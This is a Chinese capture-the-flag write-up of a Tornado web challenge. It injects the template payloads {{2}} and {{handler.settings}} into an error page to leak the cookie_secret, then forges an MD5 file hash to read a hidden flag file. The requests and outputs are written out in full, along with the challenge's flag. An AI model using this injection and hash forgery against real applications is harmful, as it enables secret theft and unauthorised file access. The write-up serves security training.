```
http://111.200.241.244:55572/file?filename=/flag.txt&filehash=b7a504b137e20f372ed87ffb400cccd1

/flag.txt
flag in /fllllllllllllag
```

```
http://111.200.241.244:55572/file?filename=/hints.txt&filehash=3450e1a8e507c183499b1b870cd02947

/hints.txt
md5(cookie_secret+md5(filename))
```

根据提示，需要得到/fllllllllllllag对应的MD5值，需要获得cookie_secret的值。

当输入的filepath的值错误时，会跳转到/error页面：

```
http://111.200.241.244:55572/error?msg=Error

Error

http://111.200.241.244:55572/error?msg={{2}}

2
```

存在模板注入漏洞，题目提示使用Tornado 框架，使用`handler.settings`查看配置信息：

```
http://111.200.241.244:55572/error?msg={{handler.settings}}

//得到cookie_secret
{'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': '64840663-6be8-4f60-9f4e-cd91b60a95eb'}
```

计算/fllllllllllllag对应的MD5值。

```
http://111.200.241.244:55572/file?filename=/fllllllllllllag&filehash=f04f7f780f6deca585729873c3a77bbc

/fllllllllllllag
flag{3f39aea39db345769397ae895edb9c70}
```

得到flag：flag{3f39aea39db345769397ae895edb9c70}

